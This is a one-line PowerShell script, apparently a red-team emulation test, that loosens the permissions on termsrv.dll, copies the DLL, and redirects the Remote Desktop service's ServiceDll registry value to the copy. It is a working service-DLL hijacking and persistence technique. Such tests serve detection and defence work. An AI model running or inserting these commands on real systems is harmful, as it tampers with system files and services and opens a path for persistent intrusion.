$termsrvDll = "C:\Windows\System32\termsrv.dll"; $ACL = Get-Acl $termsrvDll; $permission = "Administrators","FullControl","Allow"; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL; Copy-Item -Path $termsrvDll -Destination "$HOME\AtomicTest.dll"; $newServiceDll = "$HOME\AtomicTest.dll"; $registryPath = "HKLM:\System\CurrentControlSet\services\TermService\Parameters"; if (Test-Path -Path $registryPath) {;     Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value $newServiceDll;     Write-Host "ServiceDll value in the registry has been updated to: $newServiceDll"; } else {;     Write-Host "Registry key not found. Make sure the 'TermService\Parameters' key exists."; }